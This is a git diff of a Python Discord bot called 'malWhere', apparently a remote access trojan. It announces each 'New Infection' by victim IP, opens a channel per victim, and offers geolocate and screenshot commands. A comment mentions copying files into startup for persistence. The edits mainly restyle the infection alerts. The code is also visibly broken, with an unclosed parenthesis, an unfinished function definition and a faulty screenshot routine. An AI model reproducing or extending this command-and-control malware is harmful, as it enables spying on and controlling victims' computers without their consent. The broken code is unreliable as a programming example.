@@ -55,10 +55,11 @@ async def on_ready():
   #clone necesssary files into startup 
   existing_channel = discord.utils.get(guild.channels, name=ip4chan)
   if not existing_channel:
-    await infectionschannel.send(f"New Infection from {ip} connection is established.. wating for commands")
+    embed=discord.Embed(title="New Infection", url="", description=(f"New Infection from {ip} connection is established.. wating for commands")
     await guild.create_text_channel(ip)
+    await infectionschannel.send(embed=embed)
   else:
-    await infectionschannel.send(f"{ip} already infected connection is established.. wating for commands")
+    embed=discord.Embed(title="Duplicate Infection", url="", description=(f"{ip} already infected connection is established.. wating for commands")
 
 @malWhere.command()
 async def geolocate(ctx):
@@ -78,6 +79,7 @@ async def geolocate(ctx):
     await ctx.channel.send("wrong channel skid")
 
 
+#out of order due to replit having issues with xauth and ./xauthority files
 @malWhere.command()
 async def screenshot(ctx):
   existing_channel = discord.utils.get(guild.channels, name=ip4chan)
@@ -89,7 +91,10 @@ channel = discord.utils.get(ctx.guild.channels, name=f"{ip} media")
 channel_id = channel.id
 mediachan=malWhere.get_channel(channel_id)
 mediachan.send(image="tempimage.png")
+#############################################################################
 
+@malWhere.command()
+async def 
 
 
 malWhere.run(TOKEN)
